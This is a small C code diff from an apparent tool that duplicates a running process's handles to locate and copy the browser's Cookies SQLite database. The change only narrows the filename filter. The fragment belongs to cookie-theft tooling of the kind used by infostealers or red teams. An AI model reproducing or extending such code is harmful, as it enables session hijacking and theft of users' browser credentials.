@@ -116,7 +116,7 @@ VOID CopyDatabaseBruteForceHandleByPID(DWORD PID) {
             CHAR filename[256];
             memset(filename, 0x00, 256);
             GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
-            if(strstr(filename, "Cookies") != NULL && strstr(filename, "Cookies-journal") == NULL) {
+            if(strstr(filename, "Cookies") != NULL && strstr(filename, "Cookies-journal") == NULL && strstr(filename, "Browsing Cookies") == NULL) {
                 printf("Cookie SQLite db found %s\n", filename);
 
                 CHAR appdata[256];
